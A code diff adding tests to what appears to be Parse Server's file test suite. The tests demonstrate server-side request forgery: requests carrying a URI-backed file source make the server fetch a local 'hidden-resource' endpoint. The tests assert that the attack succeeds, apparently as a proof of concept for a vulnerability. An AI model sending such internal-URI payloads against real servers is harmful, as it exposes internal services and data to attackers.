@@ -3,6 +3,8 @@
 
 'use strict';
 
+const http = require('http');
+
 const { FilesController } = require('../lib/Controllers/FilesController');
 const request = require('../lib/request');
 
@@ -651,6 +653,76 @@ describe('Parse.File testing', () => {
         const body = response.text;
         expect(body).toEqual('{"code":122,"error":"Filename not provided."}');
         done();
+      });
+    });
+
+    fdescribe('SSRF exploit attempts during file creation', () => {
+      let internalServer;
+      let capturedRequests;
+      let serverPort;
+
+      beforeEach(async () => {
+        capturedRequests = [];
+        internalServer = http.createServer((req, res) => {
+          capturedRequests.push({ url: req.url, headers: req.headers });
+          res.writeHead(200, { 'Content-Type': 'text/plain' });
+          res.end('internal secret');
+        });
+        await new Promise(resolve => internalServer.listen(0, '127.0.0.1', resolve));
+        serverPort = internalServer.address().port;
+      });
+
+      afterEach(async () => {
+        if (internalServer) {
+          await new Promise(resolve => internalServer.close(resolve));
+          internalServer = null;
+        }
+      });
+
+      it('allows SSRF via URI-backed file upload over REST', async () => {
+        const response = await request({
+          method: 'POST',
+          url: 'http://localhost:8378/1/classes/SSRFTest',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-Parse-Application-Id': 'test',
+            'X-Parse-REST-API-Key': 'rest',
+          },
+          body: {
+            file: {
+              __type: 'File',
+              name: 'ssrf.txt',
+              _source: {
+                format: 'uri',
+                uri: `http://127.0.0.1:${serverPort}/hidden-resource`,
+              },
+            },
+          },
+        });
+        expect(response.status).toBe(201);
+        expect(capturedRequests.length).toBe(1);
+        expect(capturedRequests[0].url).toBe('/hidden-resource');
+      });
+
+      it('allows SSRF via direct REST file endpoint', async () => {
+        Parse.Cloud.beforeSave(Parse.File, () => {
+          return new Parse.File('rest-ssrf.txt', {
+            uri: `http://127.0.0.1:${serverPort}/hidden-resource`,
+          });
+        });
+        const response = await request({
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/octet-stream',
+            'X-Parse-Application-Id': 'test',
+            'X-Parse-REST-API-Key': 'rest',
+          },
+          url: 'http://localhost:8378/1/files/rest-attack.txt',
+          body: 'rest attack payload',
+        });
+        expect(response.status).toBe(201);
+        expect(capturedRequests.length).toBe(1);
+        expect(capturedRequests[0].url).toBe('/hidden-resource');
       });
     });
   });
